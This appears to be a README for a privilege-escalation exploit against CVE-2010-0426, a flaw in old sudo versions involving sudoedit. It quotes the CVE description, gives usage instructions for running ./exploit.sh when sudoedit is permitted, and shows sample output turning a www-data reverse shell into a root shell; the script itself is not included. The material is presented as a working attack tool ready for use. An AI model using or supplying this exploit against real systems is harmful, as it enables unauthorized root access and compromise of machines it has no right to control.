# CVE-2010-0426

https://www.cvedetails.com/cve/CVE-2010-0426/

sudo 1.6.x before 1.6.9p21 and 1.7.x before 1.7.2p4, when a pseudo-command is enabled, permits a match between the name of the pseudo-command and the name of an executable file in an arbitrary directory, which allows local users to gain privileges via a crafted executable file, as demonstrated by a file named sudoedit in a user's home directory. 

### Usage
Escalate privileges to root when sudoedit is in the suid list and a file can be edited as sudo (check with sudo -l)
```
./exploit.sh
```

### Examples
Escalate to root from low-priv revshell
```
www-data@g1vi:/var/tmp$ id
uid=33(www-data) gid=33(www-data) groups=33(www-data)
www-data@g1vi:/var/tmp$ ./exploit.sh
[+] Target is vulnerable
[+] Running stuff...
root@g1vi:/var/tmp$ id
uid=0(root) gid=0(root) groups=0(root)
```
